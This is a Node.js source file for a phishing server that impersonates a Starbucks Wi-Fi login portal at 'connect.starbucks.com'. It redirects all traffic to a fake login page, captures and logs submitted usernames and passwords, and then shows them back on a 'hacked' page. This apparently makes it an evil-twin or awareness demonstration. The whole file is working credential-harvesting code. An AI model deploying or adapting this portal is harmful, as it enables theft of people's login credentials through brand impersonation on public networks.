const http = require('http');
const fs = require('fs');
const uuid = require('uuid');
const domainName = 'connect.starbucks.com';
let credentials = {};

function handleGet(req, res) {
  if (req.headers.host != domainName) {
    writeResponse(res, 302, {'Location': 'http://' + domainName + '/'}, 'Loading...');
    return;
  }
  let cookies = parseCookies(req.headers.cookie);
  let resource = req.url;
  switch (resource) {
    case '/':
      resource = '/login.html';
      break;
    case '/favicon.ico':
      resource = '/img/favicon.ico';
      break;
    case '/gg':
      resource = '/hacked.html';
      break;
  }
  let resourcePath = __dirname + '/resources' + resource;
  fs.readFile(resourcePath, (error, contentBuffer) => {
    if (error) {
      writeResponse(res, 404, {}, 'Not Found');
    } else {
      if (resource == '/hacked.html'
      && cookies
      && cookies.id
      && credentials[cookies.id]
      && credentials[cookies.id].username
      && credentials[cookies.id].password) {
        let contentString = contentBuffer.toString();
        contentString = contentString.replace('[PLACEHOLDER_USERNAME]', credentials[cookies.id].username);
        contentString = contentString.replace('[PLACEHOLDER_PASSWORD]', credentials[cookies.id].password);
        contentBuffer = Buffer.from(contentString, 'utf-8');
        delete credentials[cookies.id];
      }
      writeResponse(res, 200, {}, contentBuffer);
    }
  });
}

function handlePost(req, res) {
  if (req.headers.host != domainName) {
    writeResponse(res, 302, {'Location': 'http://' + domainName + '/'}, 'Loading...');
    return;
  }
  let resource = req.url;
  switch (resource) {
    case '/login':
      parseFormData(req, formData => {
        console.log(formData); // DEBUG
        let id = uuid.v4();
        credentials[id] = {};
        credentials[id] = formData;
        writeResponse(res, 302, {'Location': '/gg', 'Set-Cookie': 'id=' + id}, 'Loading...');
      });
      break;
    default:
      writeResponse(res, 400, {}, 'Bad Request');
      break;
  }
}

function handleUnsupported(req, res) {
  writeResponse(res, 400, {}, 'Bad Request');
}

function writeResponse(res, statusCode, headers, content) {
  for (let [key, value] of Object.entries(headers)) {
    res.setHeader(key, value);
  }
  res.writeHead(statusCode);
  res.end(content);
}

function parseFormData(req, callback) {
  let body = '';
  req
  .on('data', chunk => {
    body += chunk;
  })
  .on('end', () => {
    let searchParams = new URLSearchParams(body);
    let formData = {};
    searchParams.forEach((value, key) => {
      formData[key] = value;
    });
    callback(formData);
  });
}

function parseCookies(cookieHeader) {
  let cookies = {};
  if (!cookieHeader) {
    return cookies;
  }
  cookieHeader.split(';').forEach(cookie => {
    let [key, value] = cookie.split('=');
    cookies[key] = value;
  });
  return cookies;
}

http.createServer((req, res) => {
  console.log(req.method + ': ' + req.headers.host + req.url);
  switch (req.method) {
    case 'GET':
      handleGet(req, res);
      break;
    case 'POST':
      handlePost(req, res);
      break;
    default:
      handleUnsupported(req, res);
      break;
  }
}).listen(80, '10.0.0.1');

console.log('Web server listening on 10.0.0.1:80');